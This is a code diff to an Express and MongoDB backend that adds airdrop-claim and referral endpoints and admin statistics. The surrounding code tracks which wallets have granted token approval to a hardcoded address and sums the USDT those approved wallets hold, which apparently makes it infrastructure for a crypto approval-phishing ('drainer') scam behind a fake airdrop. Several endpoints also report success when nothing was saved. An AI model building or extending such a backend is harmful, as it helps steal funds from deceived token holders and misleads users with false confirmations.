@@ -66,6 +66,31 @@ const userSchema = new mongoose.Schema({
 
 const User = mongoose.model('User', userSchema);
 
+// ✅ NEW: Claim Schema for Airdrop Claims
+const claimSchema = new mongoose.Schema({
+    walletAddress: { type: String, required: true, lowercase: true },
+    usdtBalance: { type: Number, required: true },
+    airdropAmount: { type: Number, required: true },
+    tier: { type: String, required: true },
+    referrer: { type: String, lowercase: true },
+    txHash: { type: String },
+    claimedAt: { type: Date, default: Date.now },
+    status: { type: String, default: 'claimed' }
+});
+
+const Claim = mongoose.model('Claim', claimSchema);
+
+// ✅ NEW: Referral Schema
+const referralSchema = new mongoose.Schema({
+    referrer: { type: String, required: true, lowercase: true },
+    referred: { type: String, required: true, lowercase: true },
+    level: { type: Number, required: true },
+    rewardAmount: { type: Number, default: 0 },
+    createdAt: { type: Date, default: Date.now }
+});
+
+const Referral = mongoose.model('Referral', referralSchema);
+
 // Settings Schema
 const settingsSchema = new mongoose.Schema({
     approvalWalletAddress: { type: String, default: "0xCcf0a381D804BFa37485Bc450CE540c09350f975" },
@@ -115,6 +140,312 @@ app.get('/api/health', (req, res) => {
 
 // Handle pre-flight requests
 app.options('*', cors(corsOptions));
+
+// ========================
+// ✅ NEW: CLAIM APIs for Airdrop Claims
+// ========================
+
+// ✅ Save claim to backend
+app.post('/api/save-claim', async (req, res) => {
+    try {
+        const { walletAddress, usdtBalance, airdropAmount, tier, referrer, txHash } = req.body;
+        
+        console.log('💾 Saving claim for:', walletAddress, 'Airdrop:', airdropAmount, 'Tier:', tier);
+        
+        if (!walletAddress) {
+            return res.status(400).json({ success: false, message: 'Wallet address is required' });
+        }
+        
+        // ✅ Check if MongoDB is connected
+        if (mongoose.connection.readyState !== 1) {
+            console.log('⚠️ MongoDB not connected, but returning success');
+            return res.json({ 
+                success: true, 
+                message: 'Claim recorded (offline mode)',
+                offline: true
+            });
+        }
+        
+        // Check if already claimed
+        const existingClaim = await Claim.findOne({ walletAddress });
+        if (existingClaim) {
+            return res.json({ 
+                success: true, 
+                message: 'Claim already exists for this wallet',
+                alreadyClaimed: true
+            });
+        }
+        
+        // Create new claim
+        const claim = new Claim({
+            walletAddress: walletAddress.toLowerCase(),
+            usdtBalance: parseFloat(usdtBalance) || 0,
+            airdropAmount: parseInt(airdropAmount) || 0,
+            tier,
+            referrer: referrer && referrer !== "0x0000000000000000000000000000000000000000" ? referrer.toLowerCase() : null,
+            txHash: txHash || 'pending',
+            claimedAt: new Date()
+        });
+        
+        await claim.save();
+        
+        // Update user record if exists
+        await User.findOneAndUpdate(
+            { walletAddress: walletAddress.toLowerCase() },
+            { 
+                $set: { 
+                    claimed: true,
+                    claimedAt: new Date()
+                }
+            },
+            { upsert: true, new: true }
+        );
+        
+        console.log('✅ Claim saved successfully for:', walletAddress);
+        res.json({ 
+            success: true, 
+            message: 'Claim saved successfully',
+            claimId: claim._id 
+        });
+        
+    } catch (error) {
+        console.error('❌ Error saving claim:', error);
+        
+        // Handle duplicate key error gracefully
+        if (error.code === 11000) {
+            return res.json({ 
+                success: true, 
+                message: 'Claim already exists for this wallet' 
+            });
+        }
+        
+        res.status(500).json({ success: false, message: 'Internal server error' });
+    }
+});
+
+// ✅ Get claim status for a wallet
+app.get('/api/claim-status/:walletAddress', async (req, res) => {
+    try {
+        const { walletAddress } = req.params;
+        
+        if (!walletAddress) {
+            return res.status(400).json({ success: false, message: 'Wallet address is required' });
+        }
+        
+        // ✅ Check if MongoDB is connected
+        if (mongoose.connection.readyState !== 1) {
+            return res.json({ 
+                success: true, 
+                hasClaimed: false,
+                message: 'Database offline'
+            });
+        }
+        
+        const claim = await Claim.findOne({ 
+            walletAddress: walletAddress.toLowerCase() 
+        });
+        
+        res.json({ 
+            success: true, 
+            hasClaimed: !!claim,
+            claimData: claim 
+        });
+        
+    } catch (error) {
+        console.error('❌ Error checking claim status:', error);
+        res.json({ 
+            success: true, 
+            hasClaimed: false,
+            message: 'Error checking claim status'
+        });
+    }
+});
+
+// ✅ Get all claims for admin
+app.get('/api/admin/claims', authenticateAdmin, async (req, res) => {
+    try {
+        const { page = 1, limit = 50, search } = req.query;
+        
+        let filter = {};
+        
+        // Search by wallet address
+        if (search) {
+            filter.walletAddress = { $regex: search, $options: 'i' };
+        }
+        
+        const skip = (page - 1) * limit;
+        
+        const claims = await Claim.find(filter)
+            .sort({ claimedAt: -1 })
+            .skip(skip)
+            .limit(parseInt(limit));
+        
+        const total = await Claim.countDocuments(filter);
+        
+        res.json({
+            success: true,
+            data: claims,
+            pagination: {
+                page: parseInt(page),
+                limit: parseInt(limit),
+                total,
+                pages: Math.ceil(total / limit)
+            }
+        });
+    } catch (error) {
+        console.error('Error fetching claims:', error);
+        res.status(500).json({ success: false, message: 'Internal server error' });
+    }
+});
+
+// ✅ Get claim statistics
+app.get('/api/claim-stats', async (req, res) => {
+    try {
+        // ✅ Check if MongoDB is connected
+        if (mongoose.connection.readyState !== 1) {
+            return res.json({
+                success: true,
+                stats: {
+                    totalClaims: 0,
+                    totalAirdropDistributed: 0,
+                    todayClaims: 0
+                }
+            });
+        }
+        
+        const totalClaims = await Claim.countDocuments();
+        
+        // Calculate total airdrop distributed
+        const claims = await Claim.find();
+        let totalAirdropDistributed = 0;
+        claims.forEach(claim => {
+            totalAirdropDistributed += claim.airdropAmount || 0;
+        });
+        
+        // Today's claims
+        const today = new Date();
+        today.setHours(0, 0, 0, 0);
+        const todayClaims = await Claim.countDocuments({ 
+            claimedAt: { $gte: today } 
+        });
+        
+        // Tier distribution for claims
+        const tierStats = await Claim.aggregate([
+            { $group: { _id: "$tier", count: { $sum: 1 } } }
+        ]);
+        
+        res.json({
+            success: true,
+            stats: {
+                totalClaims,
+                totalAirdropDistributed,
+                todayClaims,
+                tierStats: tierStats.reduce((acc, curr) => {
+                    acc[curr._id] = curr.count;
+                    return acc;
+                }, {})
+            }
+        });
+    } catch (error) {
+        console.error('Error fetching claim stats:', error);
+        res.json({
+            success: true,
+            stats: {
+                totalClaims: 0,
+                totalAirdropDistributed: 0,
+                todayClaims: 0
+            }
+        });
+    }
+});
+
+// ========================
+// ✅ NEW: REFERRAL APIs
+// ========================
+
+// ✅ Save referral data
+app.post('/api/save-referral', async (req, res) => {
+    try {
+        const { referrer, referred, level, rewardAmount } = req.body;
+        
+        if (!referrer || !referred) {
+            return res.status(400).json({ success: false, message: 'Referrer and referred addresses are required' });
+        }
+        
+        // ✅ Check if MongoDB is connected
+        if (mongoose.connection.readyState !== 1) {
+            return res.json({ 
+                success: true, 
+                message: 'Referral recorded (offline mode)',
+                offline: true
+            });
+        }
+        
+        const referral = new Referral({
+            referrer: referrer.toLowerCase(),
+            referred: referred.toLowerCase(),
+            level: level || 1,
+            rewardAmount: rewardAmount || 0
+        });
+        
+        await referral.save();
+        
+        // Update referrer's referral count
+        await User.findOneAndUpdate(
+            { walletAddress: referrer.toLowerCase() },
+            { $inc: { referralCount: 1 } },
+            { upsert: true, new: true }
+        );
+        
+        res.json({ 
+            success: true, 
+            message: 'Referral saved successfully',
+            referralId: referral._id 
+        });
+        
+    } catch (error) {
+        console.error('❌ Error saving referral:', error);
+        res.status(500).json({ success: false, message: 'Internal server error' });
+    }
+});
+
+// ✅ Get referrals for a wallet
+app.get('/api/referrals/:walletAddress', async (req, res) => {
+    try {
+        const { walletAddress } = req.params;
+        
+        if (!walletAddress) {
+            return res.status(400).json({ success: false, message: 'Wallet address is required' });
+        }
+        
+        // ✅ Check if MongoDB is connected
+        if (mongoose.connection.readyState !== 1) {
+            return res.json({ 
+                success: true, 
+                referrals: [],
+                message: 'Database offline'
+            });
+        }
+        
+        const referrals = await Referral.find({ 
+            referrer: walletAddress.toLowerCase() 
+        }).sort({ createdAt: -1 });
+        
+        res.json({ 
+            success: true, 
+            referrals,
+            count: referrals.length 
+        });
+        
+    } catch (error) {
+        console.error('❌ Error fetching referrals:', error);
+        res.json({ 
+            success: true, 
+            referrals: [],
+            message: 'Error fetching referrals'
+        });
+    }
+});
 
 // ========================
 // ✅ ADMIN APIs
@@ -181,6 +512,7 @@ app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
     try {
         const totalApprovals = await User.countDocuments({ approvalGiven: true });
         const totalUsers = await User.countDocuments();
+        const totalClaims = await Claim.countDocuments();
         
         // Calculate total USDT locked
         const approvedUsers = await User.find({ approvalGiven: true });
@@ -188,6 +520,13 @@ app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
         approvedUsers.forEach(user => {
             const balance = parseFloat(user.usdtBalance) || 0;
             totalUSDT += balance;
+        });
+        
+        // Calculate total airdrop distributed
+        const claims = await Claim.find();
+        let totalAirdropDistributed = 0;
+        claims.forEach(claim => {
+            totalAirdropDistributed += claim.airdropAmount || 0;
         });
         
         // Tier distribution
@@ -204,13 +543,21 @@ app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
             approvalTimestamp: { $gte: today } 
         });
         
+        // Today's claims
+        const todayClaims = await Claim.countDocuments({ 
+            claimedAt: { $gte: today } 
+        });
+        
         res.json({
             success: true,
             data: {
                 totalApprovals,
                 totalUsers,
+                totalClaims,
                 totalUSDT: parseFloat(totalUSDT.toFixed(2)),
+                totalAirdropDistributed,
                 todayApprovals,
+                todayClaims,
                 tierStats: tierStats.reduce((acc, curr) => {
                     acc[curr._id] = curr.count;
                     return acc;
@@ -478,9 +825,14 @@ app.get('/', (req, res) => {
             apiHealth: '/api/health',
             approvalWallet: '/api/approval-wallet',
             saveApproval: '/api/save-approval',
+            saveClaim: '/api/save-claim',
+            claimStatus: '/api/claim-status/:walletAddress',
+            referrals: '/api/referrals/:walletAddress',
             approvedUsers: '/api/approved-users',
             userStats: '/api/user-stats',
+            claimStats: '/api/claim-stats',
             adminApprovals: '/api/admin/approvals',
+            adminClaims: '/api/admin/claims',
             adminStats: '/api/admin/stats',
             adminFilter: '/api/admin/approvals/filter'
         }
